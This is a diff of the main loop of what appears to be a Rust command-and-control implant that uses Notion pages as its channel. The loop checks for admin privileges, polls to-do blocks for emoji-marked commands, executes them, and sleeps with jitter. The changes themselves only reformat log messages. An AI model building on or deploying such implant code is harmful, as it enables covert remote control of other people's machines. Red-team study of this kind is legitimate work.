@@ -33,7 +33,7 @@ use cmd::{NotionCommand, CommandType};
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
-    println!("Starting!");
+    println!("[*] Starting!");
     
     // Handle config options
     let mut config_options: ConfigOptions;
@@ -88,13 +88,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut hn = hostname();
 
     let is_admin = cmd::getprivs::is_elevated();  
-    println!("{}", is_admin);
+    println!("[*] Admin context: {}", is_admin);
     if is_admin {
         hn.push_str("*");
     }
 
-    println!("{:?}", hn);
-    println!("{:?}", config_options);
+    println!("[*] Hostname: {:?}", hn);
+    //println!("[*] Config options: {:?}", config_options);
     let mut headers = HeaderMap::new();
     headers.insert("Notion-Version", "2021-08-16".parse()?);
     headers.insert(CONTENT_TYPE, "application/json".parse()?);
@@ -127,7 +127,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             match block["to_do"]["text"][0]["text"]["content"].as_str() {
                 Some(s) => {
                     if s.contains("🎯") {
-                        println!("Got command: {}", s);
+                        println!("[*] Got command: {}", s);
                         let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
                         let output = notion_command.handle(&mut config_options).await?;
                         let command_block_id = block["id"].as_str().unwrap();
@@ -153,6 +153,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             time::Duration::from_secs(config_options.sleep_interval + jitter_time);
 
         thread::sleep(sleep_time);
-        println!("ZZZZ");
+        println!("[*] zzzZZZzzz: {} seconds", config_options.sleep_interval);
+        //println!("[*] Jitter: {}", config_options.jitter_time);
     }
 }
